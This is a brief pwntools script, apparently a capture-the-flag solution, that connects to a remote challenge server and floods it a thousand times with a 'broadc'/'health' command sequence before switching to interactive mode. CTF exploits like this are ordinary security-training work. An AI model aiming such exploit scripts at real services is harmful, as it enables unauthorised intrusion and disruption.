# yeah, really

from pwn import *
#r = process(["./beacon"])
r = remote("challs.htsp.ro", 8005)
for _ in range(1000):
    r.sendline(b"broadc\nhealth\nbroadc\nhealth")

r.interactive()
